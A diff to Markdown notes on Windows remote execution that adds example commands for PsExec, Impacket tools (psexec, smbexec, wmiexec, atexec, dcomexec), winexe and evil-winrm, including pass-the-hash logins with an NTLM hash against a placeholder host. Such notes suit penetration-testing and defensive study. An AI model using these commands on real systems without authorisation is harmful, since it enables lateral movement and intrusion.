@@ -33,6 +33,17 @@ All of the following remote execution techniques **require administrative creden
         
     - Create and start services (i.e., **SC_MANAGER_CREATE_SERVICE**, **SERVICE_START**)  
 - Without such permissions, PsExec will fail to operate.
+
+**Example Commands:**
+
+```bash
+# Sysinternals PsExec
+psexec.exe \\10.0.0.5 -u Administrator -p 'Password123' cmd.exe
+
+# Impacket-psexec (Pass-the-Hash example)
+psexec.py -hashes :8846f7eaee8fb117ad06bdd830b7586c domain.local/Administrator@10.0.0.5
+```
+
 **Transport Stack:**  
 `SMB (445) → RPC (svcctl) → Named Pipes`
 
@@ -86,6 +97,20 @@ All of the following remote execution techniques **require administrative creden
     - Service is stopped and removed.
         
     - Temporary output file is deleted from ADMIN$.
+
+**Example Commands:**
+
+```bash
+# Impacket-smbexec with password
+smbexec.py domain.local/Administrator:'Password123'@10.0.0.5
+
+# Impacket-smbexec with NTLM hash
+smbexec.py -hashes :8846f7eaee8fb117ad06bdd830b7586c domain.local/Administrator@10.0.0.5
+```
+
+**Transport Stack:**  
+`SMB (445) → RPC (svcctl) → SMB (output file)`
+
 ---
 
 ## WMIExec / Impacket-wmiexec
@@ -122,6 +147,17 @@ All of the following remote execution techniques **require administrative creden
         
     - Deletes the temporary file afterward.
         
+
+**Example Commands:**
+
+```bash
+# Impacket-wmiexec with password
+wmiexec.py domain.local/Administrator:'Password123'@10.0.0.5
+
+# Impacket-wmiexec with NTLM hash
+wmiexec.py -hashes :8846f7eaee8fb117ad06bdd830b7586c domain.local/Administrator@10.0.0.5
+```
+
 **Transport Stack:** `SMB (445) → DCOM/RPC (135) → WMI → SMB (output file)`
 
 ---
@@ -167,6 +203,16 @@ All of the following remote execution techniques **require administrative creden
 
 ---
 
+**Example Commands:**
+
+```bash
+# Run from Linux against Windows target
+winexe -U 'Administrator%Password123' //10.0.0.5 "cmd.exe /c whoami"
+
+# With domain account
+winexe -U 'DOMAIN/Administrator%Password123' //10.0.0.5 "powershell -c hostname"
+```
+
 **Transport Stack:**  
 `SMB (445) → RPC (svcctl) → [Pipe/File for output]`
 
@@ -204,6 +250,17 @@ All of the following remote execution techniques **require administrative creden
         
     - Output file is removed.
         
+
+
+**Example Commands:**
+
+```bash
+# Impacket-atexec (scheduled task method)
+atexec.py domain.local/Administrator:'Password123'@10.0.0.5 "whoami"
+
+# Impacket-dcomexec (Task Scheduler via DCOM)
+dcomexec.py domain.local/Administrator:'Password123'@10.0.0.5 "ipconfig"
+```
 
 **Transport Stack:**  
 `MSRPC (135 + Task Scheduler interface) → SMB (445, ADMIN$ for output)`
@@ -246,6 +303,19 @@ All of the following remote execution techniques **require administrative creden
     
     - Feels very much like a native PowerShell session — attacker can upload scripts, run modules, etc.
         
+
+**Example Commands:**
+
+```bash
+# evil-winrm (interactive shell)
+evil-winrm -i 10.0.0.5 -u Administrator -p 'Password123'
+
+# Using NTLM hash
+evil-winrm -i 10.0.0.5 -u Administrator -H '8846f7eaee8fb117ad06bdd830b7586c'
+
+# Native PowerShell remoting (Windows host)
+Enter-PSSession -ComputerName 10.0.0.5 -Credential (Get-Credential)
+```
 
 **Transport Stack:**  
 `HTTP(S) → WinRM (WS-Man SOAP) → PowerShell Remoting`
